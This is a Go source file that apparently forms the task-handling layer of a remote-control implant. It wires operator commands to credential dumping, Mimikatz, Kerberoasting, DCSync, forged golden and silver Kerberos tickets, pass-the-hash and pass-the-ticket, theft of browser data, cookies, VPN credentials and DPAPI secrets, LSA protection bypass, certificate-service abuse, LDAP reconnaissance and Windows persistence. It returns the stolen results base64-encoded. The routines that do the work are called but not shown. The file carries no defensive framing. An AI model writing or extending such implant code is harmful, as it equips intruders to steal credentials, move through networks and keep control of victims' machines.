//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"runtime"
	"strings"
)

func handleCreds(task Task, res *TaskResult) {
	out, err := dumpCreds()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleMimikatz(task Task, res *TaskResult) {
	out, err := runMimikatz(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleKerberoast(task Task, res *TaskResult) {
	out, err := kerberoast()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleDPAPIMasterKey(task Task, res *TaskResult) {
	out, err := dpapiMasterKey()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleDPAPIBlob(task Task, res *TaskResult) {
	out, err := dpapiBlob(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleDPAPIBrowser(task Task, res *TaskResult) {
	out, err := dpapiBrowser()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleLSABypass(task Task, res *TaskResult) {
	out, err := lsaBypass()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleADCSFind(task Task, res *TaskResult) {
	out, err := adcsFind()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleADCSRequest(task Task, res *TaskResult) {
	out, err := adcsRequest(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleShadowCreds(task Task, res *TaskResult) {
	out, err := shadowCreds(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleDCSync(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "dcsync is Windows-only"
		return
	}
	out, err := kerberosDCSync(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleGoldenTicket(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "golden_ticket is Windows-only"
		return
	}
	parts := strings.SplitN(task.Command, "|", 4)
	if len(parts) < 4 {
		res.Error = "format: user|domain|sid|krbtgt_hash"
		return
	}
	out, err := kerberosGoldenTicket(parts[0], parts[1], parts[2], parts[3])
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleSilverTicket(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "silver_ticket is Windows-only"
		return
	}
	parts := strings.SplitN(task.Command, "|", 5)
	if len(parts) < 5 {
		res.Error = "format: user|domain|sid|target|rc4_hash"
		return
	}
	out, err := kerberosSilverTicket(parts[0], parts[1], parts[2], parts[3], parts[4])
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleASREPRoast(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "asreproast is Windows-only"
		return
	}
	out, err := kerberosASREPRoast()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handlePassTheHash(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "pass_the_hash is Windows-only"
		return
	}
	parts := strings.SplitN(task.Command, "|", 4)
	if len(parts) < 3 {
		res.Error = "format: user|domain|ntlm_hash[|target]"
		return
	}
	target := ""
	if len(parts) > 3 {
		target = parts[3]
	}
	out, err := kerberosPassTheHash(parts[0], parts[1], parts[2], target)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handlePassTheTicket(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "pass_the_ticket is Windows-only"
		return
	}
	out, err := kerberosPassTheTicket(task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleBrowserSteal(task Task, res *TaskResult) {
	out := stealBrowserData(task.Command)
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}

func handleCookieExport(task Task, res *TaskResult) {
	browser := task.Command
	if browser == "" {
		browser = "all"
	}
	out := exportCookies(browser)
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}

func handleVpnCreds(task Task, res *TaskResult) {
	out := exportVpnCreds()
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}

func handleRemoteInput(task Task, res *TaskResult) {
	payload := task.Data
	if payload == "" {
		payload = task.Command
	}
	res.Output = remoteInputStub(payload)
}

func handleLDAPUsers(task Task, res *TaskResult) {
	out, err := ldapUsers()
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleLDAPGroups(task Task, res *TaskResult) {
	out, err := ldapGroups()
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleLDAPComputers(task Task, res *TaskResult) {
	out, err := ldapComputers()
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleLDAPSPN(task Task, res *TaskResult) {
	out, err := ldapSPN()
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleLDAPACL(task Task, res *TaskResult) {
	out, err := ldapACL()
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleLDAPQuery(task Task, res *TaskResult) {
	out, err := ldapQuery(task.Command)
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

// ── Persistence ──────────────────────────────────────────────────────────

func handlePersistenceAdd(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 2)
	method := parts[0]
	args := ""
	if len(parts) > 1 {
		args = parts[1]
	}
	if runtime.GOOS != "windows" {
		res.Error = "persistence is Windows-only"
	} else {
		res.Output = applyPersistence(method, args)
	}
}

func handlePersistenceList(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "persistence is Windows-only"
	} else {
		res.Output = listPersistence()
	}
}

func handlePersistenceRemove(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 2)
	method := parts[0]
	args := ""
	if len(parts) > 1 {
		args = parts[1]
	}
	if runtime.GOOS != "windows" {
		res.Error = "persistence is Windows-only"
	} else {
		res.Output = removePersistence(method, args)
	}
}
